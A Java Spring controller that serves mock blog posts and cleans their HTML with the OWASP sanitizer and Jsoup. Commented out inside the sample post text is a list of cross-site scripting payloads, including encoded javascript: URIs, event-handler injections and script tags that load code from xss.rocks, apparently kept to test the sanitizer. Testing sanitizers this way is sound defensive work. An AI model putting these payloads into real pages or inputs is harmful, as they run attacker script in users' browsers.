package com.github.nikit.cpp.controllers;

import com.github.nikit.cpp.Constants;
import com.github.nikit.cpp.PageUtils;
import org.jsoup.Jsoup;
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;
import org.springframework.web.bind.annotation.*;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

@RestController
@RequestMapping(Constants.Uls.API_PUBLIC+Constants.Uls.POST)
public class PostController {

    private static final List<PostDTO> POST_DTO_LIST;
    static {
        POST_DTO_LIST = new ArrayList<>();
        for (int i=0; i<100001; ++i){
            try {
                POST_DTO_LIST.add(new PostDTO(
                        (long)i,
                        "Заголовок поста Заголовок поста Заголовок поста Заголовок поста Заголовок поста Заголовок поста Заголовок поста "+i,
                        "<b>Lorem Ipsum</b> - это текст-\"рыба\", часто " +
//                                "<script type='text/javascript'>alert('XSS');</script> " +
//                                "<IMG SRC=javascript:alert('XSS')>" +
//                                "<IMG SRC=javascript:alert(\"XSS\")>" +
//                                "<img src='http://via.placeholder.com/350x150'/>" +
//                                "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>\n" +
//                                "<ScRiPT SRC=http://xss.rocks/xss.js></ScRiPT>\n" +
//                                "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n" +
//                                "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n" + // breaks next
//                                "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n" +
//                                "<IMG SRC=# onmouseover=\"alert('xxs')\">\n" +
//                                "<IMG SRC= onmouseover=\"alert('xxs')\">\n" +
//                                "<IMG onmouseover=\"alert('xxs')\">\n" +
//                                "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>\n" + // works without sanitize
//                                "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">\n" +
//                                "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&\n" +
//                                "#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n" +
//                                "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n" +
//                                "<IMG SRC=\"jav\tascript:alert('XSS');\">\n" +
//                                "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n" +
//                                "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n" +
//                                "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n" +
//                                "<IMG SRC=\" &#14;  javascript:alert('XSS');\">\n" +
//                                "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n" +
//                                "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n" +
//                                "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n" +
//                                "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n" +
//                                "<SCRIPT SRC=http://xss.rocks/xss.js?< B >\n" +
//                                "<SCRIPT SRC=//xss.rocks/.j>\n"+
//                                "<IMG SRC=\"javascript:alert('XSS')\"\n" +
//                                "<iframe src=http://xss.rocks/scriptlet.html <\n" +
//                                "</script><script>alert('XSS');</script>\n" +
//                                "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n" +
//                                "<STYLE>li {list-style-image: url(\"java\\tscript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n" +
                                "используемый в печати и вэб-дизайне. Lorem Ipsum является стандартной \"рыбой\" для текстов на латинице с начала XVI века. В то время некий безымянный печатник создал большую коллекцию размеров и форм шрифтов, используя Lorem Ipsum для распечатки образцов. Lorem Ipsum не только успешно пережил без заметных изменений пять веков, но и перешагнул в электронный дизайн. Его популяризации в новое время послужили публикация листов Letraset с образцами Lorem Ipsum в 60-х годах и, в более недавнее время, программы электронной вёрстки типа Aldus PageMaker, в шаблонах которых используется Lorem Ipsum.",
                        new URL("https://vuejs.org/images/components.png")
                ));
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
        }
    }
    // https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project
    private static final PolicyFactory SANITIZER_POLICY = new HtmlPolicyBuilder()
            .allowElements("a", "b", "img", "p")
            .allowUrlProtocols("https", "http")
            .allowAttributes("href").onElements("a")
            .allowAttributes("src").onElements("img")
            .requireRelNofollowOnLinks()
            .toFactory();



    public static class PostDTO {
        private long id;
        private String title;
        private String text;
        private URL titleImg;

        public PostDTO() { }

        public PostDTO(long id, String title, String text, URL titleImg) {
            this.id = id;
            this.title = title;
            this.text = text;
            this.titleImg = titleImg;
        }

        public long getId() {
            return id;
        }

        public void setId(long id) {
            this.id = id;
        }

        public String getTitle() {
            return title;
        }

        public void setTitle(String title) {
            this.title = title;
        }

        public String getText() {
            return text;
        }

        public void setText(String text) {
            this.text = text;
        }

        public URL getTitleImg() {
            return titleImg;
        }

        public void setTitleImg(URL titleImg) {
            this.titleImg = titleImg;
        }
    }

    private static String cleanHtmlTags(String html) {
        return html == null ? null : Jsoup.parse(html).text();
    }

    @GetMapping
    public List<PostDTO> getPosts(
            @RequestParam(value = "page", required=false, defaultValue = "0") int page,
            @RequestParam(value = "size", required=false, defaultValue = "0") int size,
            @RequestParam(value = "searchString", required=false, defaultValue = "") String searchString
    ) {
        page = PageUtils.fixPage(page);
        size = PageUtils.fixSize(size);

        return POST_DTO_LIST.stream()
                .filter(postDTO -> postDTO.getText().contains(searchString) || postDTO.getTitle().contains(searchString))
                .skip(page*size)
                .limit(size)
                .map(postDTO -> new PostDTO(postDTO.getId(), postDTO.getTitle(), cleanHtmlTags(postDTO.getText()), postDTO.getTitleImg() ))
                .collect(Collectors.toList());
    }

    public static final String sanitize(String html) {
        return SANITIZER_POLICY.sanitize(html);
    }

    @GetMapping("/{id}")
    public PostDTO getPost(
            @PathVariable("id") long id
    ) {
        return POST_DTO_LIST.stream()
                .filter(postDTO -> postDTO.getId()==id )
                .map(postDTO -> new PostDTO(postDTO.getId(), postDTO.getTitle(), sanitize(postDTO.getText()), postDTO.getTitleImg() ))
                .findFirst().orElseThrow(() -> new RuntimeException("Post " + id + " not found"));
    }

}
